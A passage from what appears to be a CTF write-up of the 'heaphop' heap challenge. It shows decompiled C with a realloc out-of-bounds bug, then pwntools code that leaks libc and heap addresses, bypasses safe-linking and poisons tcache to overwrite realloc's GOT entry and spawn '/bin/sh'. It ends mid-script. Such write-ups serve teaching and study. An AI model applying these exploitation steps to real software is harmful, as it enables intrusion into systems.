    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">tracks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] track already exists.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="n">chunk_t</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x30uLL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">buf</span> <span class="p">)</span>
      <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the tracklist name</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x20uLL</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the tracklist content length</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%ld&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">buf</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x480uLL</span> <span class="p">)</span>
      <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">v0</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
    <span class="n">buf</span><span class="o">-&gt;</span><span class="n">track</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">v0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">track</span> <span class="p">)</span>
      <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the tracklist content</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">track</span><span class="p">,</span> <span class="n">buf</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)</span> <span class="p">)</span>
      <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">tracks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[+] track successfully created.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v4</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>It crafts a chunk, and then allocates a chunk for a given size (&lt; 0x480). The read function is very basic:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">handle_read</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the tracklist ID</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="mh">0x100</span> <span class="p">)</span>
    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">tracks</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[+] track content :&#34;</span><span class="p">);</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">tracks</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">track</span><span class="p">,</span> <span class="n">tracks</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_4020FF</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] track doesn&#39;t exist.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v2</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>It prints <code>tracks[v1]-&gt;size</code> bytes from <code>tracks[v1]-&gt;track</code>. Which means no need to worry about badchars for the leak.</p>
<p>The bug lies in the <code>handle_edit</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">handle_edit</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">chunk_t</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rbx
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-24h] BYREF
</span><span class="c1"></span>  <span class="n">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-20h] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h]
</span><span class="c1"></span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">size</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the tracklist ID</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mh">0x100</span> <span class="p">)</span>
    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">tracks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the new tracklist content length</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%ld&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x480</span> <span class="p">)</span>
      <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">v0</span> <span class="o">=</span> <span class="n">tracks</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
    <span class="n">v0</span><span class="o">-&gt;</span><span class="n">track</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">realloc</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">v0</span><span class="o">-&gt;</span><span class="n">track</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the new tracklist content</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">tracks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">track</span><span class="p">,</span> <span class="n">tracks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[+] track content edited.&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] track doesn&#39;t exist.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v4</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>There are two bugs, or at least interesting behaviours around realloc. First there is an out of bound (oob) read / write, indeed if we give a size smaller than <code>tracks[idx]-&gt;size</code>, then <code>v0-&gt;track</code> could be changed to a smaller chunk and thus <code>read(0, (void *)tracks[idx]-&gt;track, tracks[idx]-&gt;size);</code> could write over the end of the chunk. Secondly we can free a chunk by giving zero to the size.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="exploitation">
        Exploitation
        <a data-clipboard-text="https://nasm.re/posts/heaphop/#exploitation" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Exploitation" href="#exploitation">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Given tcache poisoning seems to be pretty easy to achieve, we need to find where we could use our arbitrary write. If you remind well, the binary isn&rsquo;t PIE based and has only partial RELRO, which means we could easily hiijack the GOT entry of a function (like realloc) to replace it with system and then call <code>realloc(&quot;/bin/sh&quot;)</code>. This way we need to get a heap and a libc leak.</p>
<div class="gblog-post__anchorwrap">
    <h3 id="libc-leak">
        libc leak
        <a data-clipboard-text="https://nasm.re/posts/heaphop/#libc-leak" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor libc leak" href="#libc-leak">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>To get a libc leak we can fill the tcache and free a large chunk to make appear libc addresses on the heap and then read it through the oob read. Which gives:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;0&#34;</span><span class="p">)</span>

<span class="c1"># Step one, 7 chunks to fill tcache later</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="c1"># small chunk which will be used to the oob r/w</span>
<span class="n">create</span><span class="p">(</span><span class="mi">8</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;_&#34;</span><span class="p">)</span>
<span class="c1"># victim chunk</span>
<span class="n">create</span><span class="p">(</span><span class="mi">9</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;_&#34;</span><span class="p">)</span>

<span class="c1"># chunk with big size that will be used for the oob r/w</span>
<span class="n">create</span><span class="p">(</span><span class="mi">10</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;barreer&#34;</span><span class="p">)</span>
<span class="n">create</span><span class="p">(</span><span class="mi">10</span><span class="o">+</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;barree2&#34;</span><span class="p">)</span>

<span class="c1"># fill tcache</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>

<span class="c1"># oob chunk </span>
<span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span> <span class="c1"># we free in order that at the next edit it actually allocates a new chunk</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;_&#34;</span><span class="p">)</span> <span class="c1"># allocated in 9</span>

<span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># falls in the unsortedbin</span>

<span class="n">read</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span> <span class="c1"># oob read</span>
<span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x219ce0</span>
</code></pre></div><p>The heap looks like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">0x1d83120       0x0000000000000000      0x0000000000000041      ........A.......        &lt;<span class="o">=</span> chunk used to get the oob r/w
0x1d83130       0x000000000000000a      0x0000000000000000      ................                                                                               
0x1d83140       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83150       0x0000000000000020      0x0000000000000000       ...............
0x1d83160       0x0000000000000000      0x0000000000000031      ........1.......        &lt;<span class="o">=</span> track buffer of the chunk used to get the oob r/w
0x1d83170       0x0000000000000a5f      0x0000000000000000      _...............                                                                               
0x1d83180       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83190       0x0000000000000000      0x0000000000000041      ........A.......        &lt;<span class="o">=</span> victim chunk, size: 0x400, its track field is fell into the unsortedbin
0x1d831a0       0x000000000000000a      0x0000000000000000      ................                                                                               
0x1d831b0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d831c0       0x0000000000000400      0x0000000000000000      ................                                                                               
0x1d831d0       0x0000000000000000      0x0000000000000411      ................        &lt;-- unsortedbin<span class="o">[</span>all<span class="o">][</span>0<span class="o">]</span>                                                
0x1d831e0       0x00007f0eb218dce0      0x00007f0eb218dce0      ................                                                                               
0x1d831f0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83200       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83210       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83220       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83230       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83240       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83250       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83260       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83270       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83280       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83290       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832a0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832b0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832c0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832d0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832e0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832f0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83300       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83310       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83320       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83330       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83340       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83350       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83360       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83370       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83380       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83390       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d833a0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d833b0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d833c0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d833d0       0x0000000000000000      0x0000000000000000      ................
0x1d833e0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d833f0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83400       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83410       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83420       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83430       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83440       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83450       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83460       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83470       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83480       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83490       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834a0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834b0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834c0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834d0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834e0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834f0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83500       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83510       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83520       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83530       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83540       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83550       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83560       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83570       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83580       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83590       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d835a0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d835b0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d835c0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d835d0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d835e0       0x0000000000000410      0x0000000000000040      ........@.......        &lt;<span class="o">=</span> Freed chunk <span class="m">11</span>
0x1d835f0       0x000000000000000a      0x0000000000000000      ................                                                                               
0x1d83600       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83610       0x0000000000000200      0x0000000001d83170      ........p1......                                                                               
0x1d83620       0x0000000000000000      0x0000000000000211      ................                                                                               
0x1d83630       0x0000000000001d83      0x5b5e1382ca86a7f8      ..............^<span class="o">[</span>        &lt;-- tcachebins<span class="o">[</span>0x210<span class="o">][</span>0/1<span class="o">]</span>                                             
0x1d83640       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83650       0x0000000000000000      0x0000000000000000      ................                             
0x1d83660       0x0000000000000000      0x0000000000000000      ................                             
0x1d83670       0x0000000000000000      0x0000000000000000      ................                             
0x1d83680       0x0000000000000000      0x0000000000000000      ................                             
0x1d83690       0x0000000000000000      0x0000000000000000      ................                             
0x1d836a0       0x0000000000000000      0x0000000000000000      ................                             
0x1d836b0       0x0000000000000000      0x0000000000000000      ................                             
0x1d836c0       0x0000000000000000      0x0000000000000000      ................                             
0x1d836d0       0x0000000000000000      0x0000000000000000      ................                             
0x1d836e0       0x0000000000000000      0x0000000000000000      ................                             
0x1d836f0       0x0000000000000000      0x0000000000000000      ................                             
0x1d83700       0x0000000000000000      0x0000000000000000      ................                             
0x1d83710       0x0000000000000000      0x0000000000000000      ................                             
0x1d83720       0x0000000000000000      0x0000000000000000      ................                             
0x1d83730       0x0000000000000000      0x0000000000000000      ................                             
0x1d83740       0x0000000000000000      0x0000000000000000      ................                             
0x1d83750       0x0000000000000000      0x0000000000000000      ................                             
0x1d83760       0x0000000000000000      0x0000000000000000      ................                             
0x1d83770       0x0000000000000000      0x0000000000000000      ................                             
0x1d83780       0x0000000000000000      0x0000000000000000      ................                             
0x1d83790       0x0000000000000000      0x0000000000000000      ................                             
0x1d837a0       0x0000000000000000      0x0000000000000000      ................                             
0x1d837b0       0x0000000000000000      0x0000000000000000      ................                             
0x1d837c0       0x0000000000000000      0x0000000000000000      ................                             
0x1d837d0       0x0000000000000000      0x0000000000000000      ................                             
0x1d837e0       0x0000000000000000      0x0000000000000000      ................                             
0x1d837f0       0x0000000000000000      0x0000000000000000      ................                             
0x1d83800       0x0000000000000000      0x0000000000000000      ................                             
0x1d83810       0x0000000000000000      0x0000000000000000      ................                             
0x1d83820       0x0000000000000000      0x0000000000000000      ................                             
0x1d83830       0x0000000000000000      0x0000000000000041      ........A.......        &lt;<span class="o">=</span> last small chunk, barreer               
0x1d83840       0x000000000000000a      0x0000000000000000      ................                             
0x1d83850       0x0000000000000000      0x0000000000000000      ................                             
0x1d83860       0x0000000000000020      0x0000000001d83880       ........8......                             
0x1d83870       0x0000000000000000      0x0000000000000031      ........1.......                             
0x1d83880       0x00000000000a3233      0x0000000000000000      32..............                             
0x1d83890       0x0000000000000000      0x0000000000000000      ................                             
0x1d838a0       0x0000000000000000      0x000000000001e761      ........a.......        &lt;-- Top chunk        
</code></pre></div><p>I advice you to take a look at the heap layout if you do not understand the exploit script.</p>
<div class="gblog-post__anchorwrap">
    <h3 id="heap-leak">
        Heap leak
        <a data-clipboard-text="https://nasm.re/posts/heaphop/#heap-leak" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Heap leak" href="#heap-leak">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>Now we got a libc leak we&rsquo;re looking for a heap leak, it is basically the same thing as above, but instead of freeing a large chunk, we free a small <code>0x20</code> sized chunk. To understand the defeat of safe-linking I advice you to read <a
  class="gblog-markdown__link"
  href="https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation"
  
  >this</a
>. Which gives:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="c1"># leak heap to craft pointers</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;osef&#34;</span><span class="p">)</span> <span class="c1"># split unsortedbin chunk</span>
<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># tcache 0x20</span>

<span class="n">read</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span> <span class="c1"># oob read</span>
<span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span>
<span class="n">heap</span> <span class="o">=</span> <span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x2000</span> <span class="c1"># leak fp of 1</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="tcache-poisoning">
        tcache poisoning
        <a data-clipboard-text="https://nasm.re/posts/heaphop/#tcache-poisoning" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor tcache poisoning" href="#tcache-poisoning">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>To achieve tcache poisoning we just need to get the <code>0x20</code> sized chunk right after the out of bound chunk. Then we free it and we use the out of bound chunk to overwrite the forward pointer of the victim chunk to <code>&amp;realloc@GOT</code>. Given we leaked the heap we can easily bypass the safe-linking protection.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="c1">#== tcache poisoning</span>

<span class="c1"># get the 0x20 sized chunk that is right after the oob chunk</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;osef&#34;</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="c1"># tcache 0x20, count = 2, tcache poisoning is basically 10-&gt;fp = target</span>
<span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> 

<span class="c1"># oob write to set 10-&gt;fp = &amp;realloc@got-8 (due to alignment issues)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;Y&#34;</span> <span class="o">*</span> <span class="mh">0x60</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(((</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x21f0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">realloc</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)))</span> 

<span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">one_gadget</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span> <span class="c1"># useless</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># 12 =&gt; b&#34;/binb/sh\0&#34;</span>

<span class="c1"># given we falls on &amp;realloc@got-8, we overwrite got entries correctly </span>
